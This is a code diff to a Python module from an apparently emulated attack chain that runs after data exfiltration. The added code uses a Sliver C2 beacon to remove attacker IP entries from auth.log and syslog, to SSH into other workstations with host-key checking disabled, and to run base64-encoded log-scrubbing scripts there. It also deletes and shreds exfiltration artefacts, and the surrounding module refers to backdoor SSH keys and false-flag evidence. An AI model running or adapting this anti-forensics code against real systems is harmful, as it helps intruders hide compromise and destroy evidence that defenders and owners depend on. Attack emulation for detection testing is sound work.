@@ -11,7 +11,8 @@ MITRE ATT&CK:
   T1098.004 - Account Manipulation: SSH Authorized Keys (vinzenz_ws backdoor pubkey)
   T1565.001 - Data Manipulation: Stored Data Manipulation (false-flag artefacts)
 -----------------------------------------------------------------------------
-Runs AFTER advanced_exfiltration as the closing act of the advanced chain.
+Runs AFTER advanced_exfiltration (PR #163) as the closing act of the
+advanced chain.
 
 The basic chain's defense_evasion.py is intentionally "messy and loud" — this
 module is the deliberate opposite. Every phase chooses the stealthier of two
@@ -26,9 +27,12 @@ Inputs (from upstream chain steps):
   - vinzenz_beacon        (PR #148, advanced_lateral_movement) → vinzenz.fedora
   - vinzenz_password_file (PR #152, advanced_vinzenzws_privesc)→ captured admin pw
 
-Hosts touched: apache + vinzenz_ws. john_ws never in scope (advanced chain
-never lands there). db-internal + router unreachable directly — Phase 3.5
-dilutes the evidence they unavoidably contain rather than trying to remove it.
+Hosts touched: apache, vinzenz_ws, john_ws, luke_ws. advanced_exfiltration
+(PR #163) reaches john_ws and luke_ws via SSH from vinzenz_ws using the
+cross-fleet master key; Phase 3b scrubs auth.log on those hosts and removes
+exfil-phase temp files (pubkey, harvester scripts) via the same SSH path.
+db-internal + router remain unreachable directly — Phase 3.5 dilutes their
+unavoidable log evidence.
 """
 
 import base64
@@ -55,6 +59,7 @@ APACHE_PERSISTENCE_STAGER = "/usr/local/apache2/cgi-bin/health_check.cgi"
 APACHE_LATERAL_STAGER     = "/usr/local/apache2/cgi-bin/stats.cgi"
 VINZENZ_PRIVESC_DROP      = "/tmp/.sys_update.lock"
 VINZENZ_EXFIL_DUMP        = "/tmp/.sys_backup.gz"
+VINZENZ_EXFIL_PUBKEY      = "/tmp/pubkey.pem"       # encryption pubkey staged by exfil
 
 # =============================================================================
 # Constants — backdoor placements
@@ -397,6 +402,7 @@ _APACHE_LOG_PATTERNS = "|".join([
     r"ReSpawnHttpdCache",       # health_check.cgi trigger UA
     r"TEMPORARY_FACSIMILE",     # leaked Sliver session-name artefact
     r"ESSENTIAL_STEP",          # leaked Sliver beacon-name artefact
+    r"10\.30\.0\.8",            # vinzenz_ws IP — harvester SSH source during exfil
 ])
 
 # vinzenz_ws auth.log patterns — beacon check-ins running as root, sudo
@@ -406,6 +412,7 @@ _VINZENZ_AUTH_PATTERNS = "|".join([
     r"Accepted publickey for root",
     r"session opened for user root by",
     r"sudo:.*vinzenz\.fedora.*USER=root ; .*apt-get update",
+    r"sudo:.*vinzenz\.fedora.*USER=root ; .*(find|openssl|fstrim|tar|gzip|pg_dump|psql)",
 ])
 
 
@@ -432,6 +439,21 @@ def _phase3_scrub_logs(root_sliver_session: str,
         "apache:/usr/local/apache2/logs/error_log",
     ]
     log("[+] apache access_log + error_log: attacker IOCs grep'd out, mtimes restored")
+
+    # apache auth.log / syslog — SSH entries from vinzenz_ws during exfil harvest.
+    # Also removes /tmp/pubkey.pem (encryption key staged by advanced_exfiltration).
+    apache_auth_scrub = (
+        "execute -o -- sh -c '"
+        "for log in /var/log/auth.log /var/log/syslog; do "
+        "  [ -f \"$log\" ] || continue; "
+        "  grep -vE \"10\\.30\\.0\\.8\" \"$log\" > \"$log.clean\" 2>/dev/null && "
+        "  cat \"$log.clean\" > \"$log\" && rm -f \"$log.clean\"; "
+        "done; "
+        "rm -f /tmp/pubkey.pem 2>/dev/null; true'"
+    )
+    sliver_exec(root_sliver_session, apache_auth_scrub, timeout=15)
+    scrubbed.append("apache:/var/log/auth.log (exfil harvest SSH entries grep'd out)")
+    log("[+] apache auth.log: exfil harvest SSH traces removed; /tmp/pubkey.pem wiped")
 
     # ---- vinzenz_ws (root via pwfile redirect, not echo-pipe) ----
     # The grep-loop runs as root. sudo's stdin is the password file; sh -c's
@@ -489,6 +511,52 @@ def _phase3_scrub_logs(root_sliver_session: str,
         timeout=10,
     )
     scrubbed.append("apache:/root/.bash_history (truncated if non-empty)")
+
+    return scrubbed
+
+
+# =============================================================================
+# Phase 3b — Scrub exfil-phase traces from john_ws and luke_ws
+# =============================================================================
+
+def _phase3b_scrub_remote_workstation_traces(vinzenz_beacon: str) -> list[str]:
+    """Scrub exfil-phase SSH traces from john_ws and luke_ws via vinzenz's SSH.
+
+    advanced_exfiltration (PR #163) reaches john_ws and luke_ws via SSH from
+    vinzenz_ws using the cross-fleet master key, leaving auth.log entries and
+    exfil temp files (/tmp/pubkey.pem, harvester scripts) on those hosts.
+    We reuse vinzenz's existing SSH connectivity — no new Sliver session needed.
+    """
+    log("\n[*] ── Phase 3b: scrub remote workstation exfil traces ──────")
+    scrubbed: list[str] = []
+
+    # Script sent via SSH: scrubs lines containing vinzenz_ws IP (10.30.0.8)
+    # from auth.log (+ persist mirror) and removes exfil temp files.
+    # Base64-encoded to avoid multi-level quoting issues in the sliver execute
+    # → SSH → sh invocation chain.
+    remote_script = (
+        "for log in /var/log/auth.log /var/log/persist/auth.log; do "
+        "  [ -f \"$log\" ] || continue; "
+        "  grep -vE '10\\.30\\.0\\.8' \"$log\" > \"$log.clean\" 2>/dev/null && "
+        "  cat \"$log.clean\" > \"$log\" && rm -f \"$log.clean\"; "
+        "done; "
+        "rm -f /tmp/pubkey.pem /tmp/harv_collect.sh 2>/dev/null; "
+        "true"
+    )
+    b64_remote = _b64(remote_script)
+
+    for remote in ("john", "luke"):
+        ssh_cmd = (
+            f"execute -o -- sh -c "
+            f"'ssh -n -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {remote} "
+            f"\"echo {b64_remote} | base64 -d | sh\" 2>/dev/null || true'"
+        )
+        sliver_exec(vinzenz_beacon, ssh_cmd, timeout=25)
+        scrubbed += [
+            f"{remote}_ws:/var/log/auth.log (vinzenz harvest entries grep'd out)",
+            f"{remote}_ws:/tmp/pubkey.pem + harvester scripts removed",
+        ]
+        log(f"[+] {remote}_ws: auth.log scrubbed, exfil temp files removed")
 
     return scrubbed
 
@@ -576,7 +644,7 @@ def _phase4_secure_wipe(root_sliver_session: str,
     # through the beacon check-in in time, the shred ran on the target.
     # Phase 4 is the LAST phase before Phase 5 anyway, so a missed marker
     # only affects reporting, not correctness.
-    vinzenz_targets = [VINZENZ_PRIVESC_DROP, VINZENZ_EXFIL_DUMP]
+    vinzenz_targets = [VINZENZ_PRIVESC_DROP, VINZENZ_EXFIL_DUMP, VINZENZ_EXFIL_PUBKEY]
     for path in vinzenz_targets:
         wipe_cmd = (
             f"execute -o -- sh -c "
@@ -675,6 +743,12 @@ def run(
         )
     except Exception as exc:
         log(f"[!] phase 3 (log scrub) failed: {exc}")
+
+    # Phase 3b: scrub exfil-phase SSH traces from john_ws + luke_ws.
+    try:
+        logs_scrubbed += _phase3b_scrub_remote_workstation_traces(vinzenz_beacon)
+    except Exception as exc:
+        log(f"[!] phase 3b (remote workstation scrub) failed: {exc}")
 
     # Phase 3.5: evidence-burial — optional toggle.
     if bury_evidence:
